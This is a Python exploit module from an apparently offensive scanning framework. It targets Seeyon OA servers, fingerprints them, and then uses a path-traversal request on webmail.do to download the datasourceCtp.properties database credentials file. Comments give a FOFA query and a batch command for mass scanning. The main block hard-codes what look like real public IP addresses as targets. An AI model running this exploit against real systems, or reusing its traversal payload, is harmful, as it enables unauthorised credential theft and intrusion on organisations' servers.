# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 12:32

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# fofa: app="致远互联-OA"
# python batch.py -m exploit.scripts.OA.Seeyon.webmail_do_readfile -cs -fs "app=\"致远互联-OA\""

class Script(BaseScript):
    name = 'Seeyon'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties']
        # 相关信息
        self.info = '''致远OA A6-V5 | 致远OA A8-V5 | 致远OA G6'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '/seeyon/USER-DATA/IMAGES/LOGIN/login.gif' in text or '/seeyon/common/' in text or 'M3 Server' in text or 'M1-Server' in text or '/seeyon/user-data/images/login/login.gif' in text or 'seeyonproductid' in text or "ar _ctxpath = '/seeyon'" in text or 'a8-v5企业版' in text or '/seeyon/' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'workflow' in text:
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                            return {'name': 'seeyon webmail do readfile', 'url': url, 'software': self.name}

if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
